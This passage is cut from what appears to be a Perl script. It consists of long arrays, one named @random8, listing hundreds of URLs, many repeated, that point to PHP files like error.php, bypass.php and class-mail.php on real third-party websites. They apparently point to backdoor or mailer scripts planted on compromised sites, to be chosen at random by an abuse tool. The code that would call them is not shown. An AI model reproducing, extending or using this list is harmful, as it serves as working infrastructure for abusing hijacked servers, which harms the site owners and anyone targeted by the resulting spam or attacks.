"http://www.orfej.si/components/com_mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.dileeponline.com/errors.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://hi.ctust.edu.tw/medicalcontest//components/com_mailto/error.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://www.telsonet.pl/errors.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://vdfs.ru//plugins/editors/error.php",
"http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.ele-eme.com.mx/error.php",
"http://virtualmacompetition.com//error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.sbagro.org.br/modules/mod_login/error.php",
"http://deangelisviaggi.it//wp-admin/network/error.php",
"http://www.elado.ro//xmlrpc/error.php",
"http://www.oem-dealer-parts.ca//components/com_media/error.php",
"http://blog.eurostargym.com/wp-includes/js/thickbox/class-mail.php",
"http://shop.stroiportal.kz/cgi-bin/error.php",
"http://www.mecanica.ufrj.br/ufrj-em//components/error.php",
"http://www.t1site.com.br/wp-admin/error.php",
"http://quadrabrain.com//wp-admin/error.php",
"http://milesnation.com/whitney/css/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.gardenmachinery.ie/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.ehbo-eelde.nl/media/error.php",
"http://www.cocofashion.com.au/errors.php",
"http://www.alexgretter.com/google.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.thewigmall.com/errors.php",
"http://www.solucionesparati.net/CMS2008/images/error.php",
"http://www.allcam.org/errors.php",
"http://totalfish.hu/errors.php",
"http://circuitec.com.br/errors.php",
"http://www.theatresprives.com/errors.php",
"http://wesotech.com/contact/google.php",
"http://moreketing.mx/errors.php",
"http://sufbellman.dk/media/error.php",
"http://www.mariobabiera.com/google.php",
"http://jhealthy.com/jhome//wp-admin/error.php",
"http://virtual-aerospace.co.jp/errors.php",
"http://www.studiogross.com.br/web/wp-includes/error.php",
"http://pastorbonus.sk/errors.php",
"http://test.stramed.com.tr/errors.php",
"http://metroway.com/wp-includes/ID3/proxy.php",
"http://www.psdf.org.pk/errors.php",
"http://iheld.com/errors.php",
"http://bohealth.eu/media/com_jantivirus/css/index.php",
"http://www.musetti.eu/errors.php",
"http://pngk.kz/media/media/css/index.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://www.lincos.si/components/com_banners/models/error.php",
"http://eventos.unisangil.edu.co/media/media/css/index.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.kawaiishop.fr/var/pass/search.php",
"http://lisarkent.com/errors.php",
"http://savvyschools.ie/wp-includes/images/pass/script-loader.php",
"http://www.bespoke-valeting.co.uk/wp-includes/error.php",
"http://www.tkofschip.be/joomlasites/ankerintranet5/plugins/content/config.index.php",
"http://blizzsozz.com/errors.php",
"http://www.conradel.com/errors.php",
"http://www.jaguarcarclubofwa.com.au/jaguarcarclubofwa/images/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://kavkazinterpress.ru/plugins/content/config.inc.php",
"http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://www.pkstorages.com//plugins/content/seka.php",
"http://www.3freebids.com/error.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://www.cannell-immobilier.com/errors.php",
"http://themansphere.com/wp-includes/error.php",
"http://hoponhopoff.ge/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://www.thermona-ekb.ru/errors.php", 
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://islamone.org/flash/errors.php",
"http://pnpdistribuidora.com.br//erros/errors.php",
"http://ancoimbra.net//media/errors.php",
"http://heb.smart-test.co.il/errors.php",
"http://www.thomastyreperu.com//plugins/errors.php",
"http://soosh-lb.com//errors.php",
"http://eshopbmw.com//skin/adminhtml/default/error.php",
"http://www.mecanica.coppe.ufrj.br/ufrj-em//components/com_media/error.php",
"http://www.iwhatswatch.com//skin/frontend/default/default/images/error.php",
"http://www.imc-egypt.org//cli/error.php",
"http://www.thermona-ekb.ru/errors.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://australiansuperaudit.com.au/errors.php",
"http://www.angola-embassy.nl/errors.php",
"http://www.pece.com.my/2014/wp-content/themes/Avada/framework/error.php",
"http://www.ares-asesores.com/ares/wp-content/languages/error.php",
"http://kontento.eu/wp-content/themes/smartbox-theme/error.php",
"http://arpwegenwaterbouw.nl/wp-content/themes/smartbox-theme/error.php",
"http://vatnedekkservice.no/wp-includes/js/thickbox/class-mail.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://pnpdistribuidora.com.br//errors.php",
"http://clinicavanity.com.br/2012/wp-includes/error.php",
"citizenofburma.org//plugins/content/errors.php",
"http://choir.louwanjpoujezi.org//plugins/content/errors.php",
"http://gdthuyphuong.free.fr//includes/errors.php",
"https://unique-sportstime.de/shop/skin/install/default/errors.php",
"http://cnsave.koray.cn/errors.php",
"http://www.masterlocksleutelkluis.nl/errors.php",
"http://ecom.wilburhuang.com/errors.php",
"http://demo.ecommerce.facto.cl/magento/1.9/skin/errors.php",
"http://centralcaixas.com/mdf/errors.php",
"http://www.bazardakau.com.br/errors.php",
"http://shardha.in/errors.php",
"http://www.sapphireengagement.co.uk/errors.php",
"http://sifide.gob.mx/errors.php",
"http://www.dibbs.co.za/errors.php",
"http://www.shop.mitrapai.com/skin/errors.php",
"http://dev2.etwebsolutions.com/magento/test/1901/errors.php",
"http://khhalisi.com/media/errors.php",
"http://petbox.in//media/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://automarket-fortuna.ru/errors.php",
"http://www.cloudipalarm.nl//wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://www.sumkimig.ru//phpthumb/error.php",
"http://belvg.info/demo/magento/framershop/skin/frontend/default/error.php",
"http://tsat-dashboard.com/videocache/bypass.php",
"http://newtec.vn//bypass.php",
"http://139.59.69.212/bypass.php",
"http://sweetfeel.sigmacell.in/bypass.php",
"http://www.prikabylove.com/downloader/bypass.php",
"http://3dproducts.com.ec/bypass.php",
"http://www.heliboss.com.mx//skin/bypass.php",
"http://www.chemistlanes.com/bypass.php",
"http://zend.secl.com.ua/media/bypass.php",
"http://www.vonora.net/bypass.php",
"http://www.motisa.com/bypass.php",
"https://gpscsomagok.hu/skin/bypass.php",
"http://www.studiofifteen.in/errors.php",
"http://daddivamoda.com.br/bypass.php",
"http://hoponhopoff.ge//errors.php",
"http://www.mirabalcenter.org//errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://www.flowershop-neo.com/wp-includes/error.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://ivanous.free.fr/camu_s_world/images/stories/jump.php",
"http://www.pessebristassumpcio.com/wp-includes/error.php",
"http://www.pricepaving.com//wp-includes/js/plupload/index.php",
"http://www.travelpointer.ro//wp-includes/js/plupload/index.php",
"http://www.zsp.karpacz.pl//libraries/joomla/document/index.php",
"http://www.studio-aid.it//libraries/joomla/database/index.php",
"http://www.corteganamedieval.com/components/com_content/views/section/tmpl/page-sidebar.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.orfej.si/components/com_mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.dileeponline.com/errors.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://hi.ctust.edu.tw/medicalcontest//components/com_mailto/error.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://www.telsonet.pl/errors.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://vdfs.ru//plugins/editors/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.ele-eme.com.mx/error.php",
"http://virtualmacompetition.com//error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.sbagro.org.br/modules/mod_login/error.php",
"http://deangelisviaggi.it//wp-admin/network/error.php",
"http://www.elado.ro//xmlrpc/error.php",
"http://www.oem-dealer-parts.ca//components/com_media/error.php",
"http://blog.eurostargym.com/wp-includes/js/thickbox/class-mail.php",
"http://quadrabrain.com//wp-admin/error.php",
"http://milesnation.com/whitney/css/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.gardenmachinery.ie/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.cocofashion.com.au/errors.php",
"http://www.alexgretter.com/google.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.thewigmall.com/errors.php",
"http://www.allcam.org/errors.php",
"http://circuitec.com.br/errors.php",
"http://www.theatresprives.com/errors.php",
"http://sufbellman.dk/media/error.php"

);

my @random8  = ("www.beslistfietsen.nl/errors.php",
"citizenofburma.org//plugins/content/errors.php",
"http://choir.louwanjpoujezi.org//plugins/content/errors.php",
"http://gdthuyphuong.free.fr//includes/errors.php",
"http://cnsave.koray.cn/errors.php",
"http://www.masterlocksleutelkluis.nl/errors.php",
"http://ecom.wilburhuang.com/errors.php",
"http://demo.ecommerce.facto.cl/magento/1.9/skin/errors.php",
"http://zamzamsweets.in/errors.php",
"http://centralcaixas.com/mdf/errors.php",
"http://www.bazardakau.com.br/errors.php",
"http://shardha.in/errors.php",
"http://www.sapphireengagement.co.uk/errors.php",
"http://www.dvdmall.us/errors.php",
"http://sifide.gob.mx/errors.php",
"http://www.dibbs.co.za/errors.php",
"http://www.shop.mitrapai.com/skin/errors.php",
"http://www.rotarymowers.com.au/errors.php",
"http://printi.be/errors.php",
"http://dev2.etwebsolutions.com/magento/test/1901/errors.php",
"http://khhalisi.com/media/errors.php",
"http://petbox.in//media/errors.php",
"http://orcastudio.co/blog/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://automarket-fortuna.ru/errors.php",
"http://www.cloudipalarm.nl//wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://www.sumkimig.ru//phpthumb///error.php",
"http://www.decorvega.es/bypass.php",
"http://belvg.info/demo/magento/framershop/skin/frontend/default/error.php",
"http://re-bel.org//bypass.php",
"http://tsat-dashboard.com/videocache/bypass.php",
"http://newtec.vn//bypass.php",
"http://friendsofradstockrailwayland.org/upload/bypass.php",
"http://139.59.69.212/bypass.php",
"http://sweetfeel.sigmacell.in/bypass.php",
"http://www.prikabylove.com/downloader/bypass.php",
"http://3dproducts.com.ec/bypass.php",
"http://techno.pk/skin/bypass.php",
"http://www.heliboss.com.mx//skin/bypass.php",
"http://www.chemistlanes.com/bypass.php",
"http://kenthecomicman.com/bypass.php",
"http://zend.secl.com.ua/media/bypass.php",
"http://www.vonora.net/bypass.php",
"http://www.motisa.com/bypass.php",
"http://sumaho-print.net//bypass.php",
"https://gpscsomagok.hu/skin/bypass.php",
"http://laptopcity.co.nz/bypass.php",
"http://www.studiofifteen.in/errors.php",
"http://daddivamoda.com.br/bypass.php",
"http://hoponhopoff.ge//errors.php",
"http://www.mirabalcenter.org//errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://www.flowershop-neo.com/wp-includes/error.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://ivanous.free.fr/camu_s_world/images/stories/jump.php",
"http://www.pessebristassumpcio.com/wp-includes/error.php",
"http://www.kittfoundation.org//wp-includes/js/plupload/index.php",
"http://www.pricepaving.com//wp-includes/js/plupload/index.php",
"http://www.travelpointer.ro//wp-includes/js/plupload/index.php",
"http://www.zsp.karpacz.pl//libraries/joomla/document/index.php",
"http://www.studio-aid.it//libraries/joomla/database/index.php",
"http://www.corteganamedieval.com/components/com_content/views/section/tmpl/page-sidebar.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.orfej.si/components/com_mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.dileeponline.com/errors.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://hi.ctust.edu.tw/medicalcontest//components/com_mailto/error.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://www.telsonet.pl/errors.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://vdfs.ru//plugins/editors/error.php",
"http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.ele-eme.com.mx/error.php",
"http://virtualmacompetition.com//error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.sbagro.org.br/modules/mod_login/error.php",
"http://deangelisviaggi.it//wp-admin/network/error.php",
"http://www.elado.ro//xmlrpc/error.php",
"http://www.oem-dealer-parts.ca//components/com_media/error.php",
"http://blog.eurostargym.com/wp-includes/js/thickbox/class-mail.php",
"http://shop.stroiportal.kz/cgi-bin/error.php",
"http://www.mecanica.ufrj.br/ufrj-em//components/error.php",
"http://www.t1site.com.br/wp-admin/error.php",
"http://quadrabrain.com//wp-admin/error.php",
"http://milesnation.com/whitney/css/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.gardenmachinery.ie/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.ehbo-eelde.nl/media/error.php",
"http://www.cocofashion.com.au/errors.php",
"http://www.alexgretter.com/google.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.thewigmall.com/errors.php",
"http://www.solucionesparati.net/CMS2008/images/error.php",
"http://www.allcam.org/errors.php",
"http://totalfish.hu/errors.php",
"http://circuitec.com.br/errors.php",
"http://www.theatresprives.com/errors.php",
"http://wesotech.com/contact/google.php",
"http://moreketing.mx/errors.php",
"http://sufbellman.dk/media/error.php",
"http://www.mariobabiera.com/google.php",
"http://jhealthy.com/jhome//wp-admin/error.php",
"http://virtual-aerospace.co.jp/errors.php",
"http://www.studiogross.com.br/web/wp-includes/error.php",
"http://pastorbonus.sk/errors.php",
"http://test.stramed.com.tr/errors.php",
"http://metroway.com/wp-includes/ID3/proxy.php",
"http://www.psdf.org.pk/errors.php",
"http://iheld.com/errors.php",
"http://bohealth.eu/media/com_jantivirus/css/index.php",
"http://www.musetti.eu/errors.php",
"http://pngk.kz/media/media/css/index.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://www.lincos.si/components/com_banners/models/error.php",
"http://eventos.unisangil.edu.co/media/media/css/index.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.kawaiishop.fr/var/pass/search.php",
"http://lisarkent.com/errors.php",
"http://savvyschools.ie/wp-includes/images/pass/script-loader.php",
"http://www.bespoke-valeting.co.uk/wp-includes/error.php",
"http://www.tkofschip.be/joomlasites/ankerintranet5/plugins/content/config.index.php",
"http://blizzsozz.com/errors.php",
"http://www.conradel.com/errors.php",
"http://www.jaguarcarclubofwa.com.au/jaguarcarclubofwa/images/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://kavkazinterpress.ru/plugins/content/config.inc.php",
"http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://www.pkstorages.com//plugins/content/seka.php",
"http://www.3freebids.com/error.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://www.cannell-immobilier.com/errors.php",
"http://themansphere.com/wp-includes/error.php",
"http://hoponhopoff.ge/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://www.thermona-ekb.ru/errors.php", 
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://islamone.org/flash/errors.php",
"http://pnpdistribuidora.com.br//erros/errors.php",
"http://ancoimbra.net//media/errors.php",
"http://heb.smart-test.co.il/errors.php",
"http://www.thomastyreperu.com//plugins/errors.php",
"http://soosh-lb.com//errors.php",
"http://eshopbmw.com//skin/adminhtml/default/error.php",
"http://www.mecanica.coppe.ufrj.br/ufrj-em//components/com_media/error.php",
"http://www.iwhatswatch.com//skin/frontend/default/default/images/error.php",
"http://www.imc-egypt.org//cli/error.php",
"http://www.thermona-ekb.ru/errors.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://australiansuperaudit.com.au/errors.php",
"http://www.angola-embassy.nl/errors.php",
"http://www.pece.com.my/2014/wp-content/themes/Avada/framework/error.php",
"http://www.ares-asesores.com/ares/wp-content/languages/error.php",
"http://kontento.eu/wp-content/themes/smartbox-theme/error.php",
"http://arpwegenwaterbouw.nl/wp-content/themes/smartbox-theme/error.php",
"http://vatnedekkservice.no/wp-includes/js/thickbox/class-mail.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://pnpdistribuidora.com.br//errors.php",
"http://clinicavanity.com.br/2012/wp-includes/error.php",
"http://www.starcom1.eu/skin/adminhtml/error.php",
"http://zlotohiszpanii.pl/skin/adminhtml/error.php",
"http://king-solarman.com/skin/adminhtml/base/error.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.karpet.cz/media/system/js/jquery.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://www.cannell-immobilier.com/errors.php",
"http://circuitec.com.br/errors.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://themansphere.com/wp-includes/error.php",
"http://www.cloudipalarm.nl/wp-content/plugins/revslider/temp/errors.php",
"http://hoponhopoff.ge/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.thewigmall.com/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://www.addisyouth.org.et/components/com_mailto/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://www.telsonet.pl/errors.php",
"http://www.tcfa1.net/errors.php",
"http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://www.deltadunariilive.ro/wp-content/errors.php",
"http://fisioleste.com.br/wp-admin/errors.php",
"http://resources.opth1jobs.com//modules/errors.php",
"http://www.propertydd4u.com//errors.php",
"http://www.skipperdean.com//media/errors.php",
"http://www.baskingshark.ie//media/errors.php",
"http://flirtbogota.co/web3//media/errors.php",
"http://gaysm.pl/media/errors.php",
"http://www.baliste-club.org//media/errors.php",
"http://tbilisi-portal.com//tmp/errors.php",
"http://store.setar.aw/errors.php",
"http://www.pokal-royal.de//js/errors.php",
"http://www.fiesta-del-sol.fr//errors.php",
"http://ethnikometopo.gr//tmp/errors.php",
"http://newlifebiblechurch.org//media/errors.php",
"http://www.cjbg.ma/errors.php",
"http://donghohanghieu.diemnhan.net//errors.php",
"http://inovatyonconsorcio.com.br/errors.php",
"http://www.toprace.co.uk/errors.php",
"http://pretty-talk.com//js/lib/errors.php",
"http://ifeed.co.kr//errors.php",
"http://abcofficemoveis.com.br/novo/media/errors.php",
"http://www.gramophoneshop.nl/webshop//skin/frontend/default/errors.php",
"http://prweb.com.sg/maimee/errors.php",
"http://bkd.bimakota.go.id//wp-admin/css/colors/blue/errors.php",
"http://www.siambeautyonline.com//errors.php",
"http://www.supon.tech//skin/adminhtml/default/default/images/moneybookers/errors.php",
"http://www.icomplementi.com/picture_library/errors.php",
"http://gaysm.pl/flash/modules/global/js/errors.php",
"http://www.chrontel.com/skin/adminhtml/default/default/lib/prototype/windows/themes/magento/.../errors.php",
"http://www.internetrights.in/wp-content/plugins/contact-form-7/images/service-icons/errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://mrsteamers.com//wp-content/plugins/errors.php",
"http://onlineordering.alumaxshowerdoor.com/skin/frontend/errors.php",
"http://www.chispazorumbas.com//plugins/errors.php",
"http://projects.kurinjiemedia.com/singlemovie//wp-content/plugins/errors.php",
"http://pasionporlajusticia.com/2015//wp-content/plugins/errors.php",
"http://www.younik.co/skin/frontend/errors.php",
"http://www.fedir.it//components/com_mailto/views/mailto/errors.php",
"http://www.copati.org.br//images/jdownloads/screenshots/thumbnails/errors.php",
"http://tuva-church.com/slovo//wp-content/plugins/dzs-videogallery/errors.php",
"http://morada.com.ve/newsite//wp-content/plugins/dzs-videogallery/errors.php",
"http://cmtactical.com//skin/install/default/default/errors.php",
"http://oldfashionedman.com//errors.php",
"http://ajansfestival.com/wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://tricotrico.com/wp-includes/error.php",
"http://www.shg-vaskulitis-eifel-mosel.de//forum/style/portal/error.php",
"http://nutritie-wellness.ro/var/package/tmp/error.php",
"http://pngk.kz/media/media/css/index.php",
"http://www.3freebids.com/error.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://themansphere.com/wp-includes/error.php",
"https://www.cloudipalarm.nl/wp-content/plugins/revslider/temp/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://hi.ctust.edu.tw/medicalcontest//components/com_mailto/error.php",
"http://www.lupetticonsultoria.com.br//kellylupetti/errors.php",
"http://redzee.com.au/friends/errors.php",
"http://watchmanreports.com/errors.php",
"http://www.chispazorumbas.com//hwdvideos/errors.php",
"http://islamone.org/errors.php",
"http://hoopsnhiphop.com/errors.php",
"http://www.brasilecon.net/skin/errors.php",
"http://redzee.com.au/friends/inc/classes/errors.php",
"http://shoppershopee.com/errors.php",
"http://xoxofimp.com//errors.php",
"http://islamone.org/flash/errors.php",
"http://www.lmcreativedesign.com.br/wp-content/plugins/errors.php",
"http://heb.smart-test.co.il/errors.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://www.thermona-ekb.ru/errors.php",
"http://clinicavanity.com.br/2012/wp-includes/error.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://australiansuperaudit.com.au/errors.php",
"http://www.ares-asesores.com/ares/wp-content/languages/error.php",
"http://vatnedekkservice.no/wp-includes/js/thickbox/class-mail.php",
"http://www.jhanjhatfree.com//skin/frontend/base/errors.php",
"http://kontento.eu/wp-content/themes/smartbox-theme/error.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://therfw.com/wp-includes/error.php",
"http://representacoesdasa.com.br/wp-admin/errors.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.gardenmachinery.ie/errors.php",
"http://www.telsonet.pl/errors.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://pastorbonus.sk/errors.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://www.imakecollege.com:37001//plugins/editors/errors.php",
"http://imotionasia.com.vn/errors.php",
"http://www.theatresprives.com/errors.php",
"http://www.pece.com.my/2014/wp-content/themes/Avada/framework/error.php",
"http://moreketing.mx/errors.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.psdf.org.pk/errors.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.sbagro.org.br/modules/mod_login/error.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://circuitec.com.br/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.musetti.eu/errors.php",
"http://www.bespoke-valeting.co.uk/wp-includes/error.php",
"http://bohealth.eu/media/com_jantivirus/css/index.php",
"http://www.thewigmall.com/errors.php",
"https://www.aavamobile.com/modules/mod_search/index.php",
"http://virtual-aerospace.co.jp/errors.php",
"http://www.studiogross.com.br/web/wp-includes/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.cocofashion.com.au/errors.php",
"http://www.tkofschip.be/joomlasites/ankerintranet5/plugins/content/config.index.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.cannell-immobilier.com/errors.php",
"http://savvyschools.ie/wp-includes/images/pass/script-loader.php",
"http://sufbellman.dk//errors.php",
"http://printfastt.com.br/errors.php",
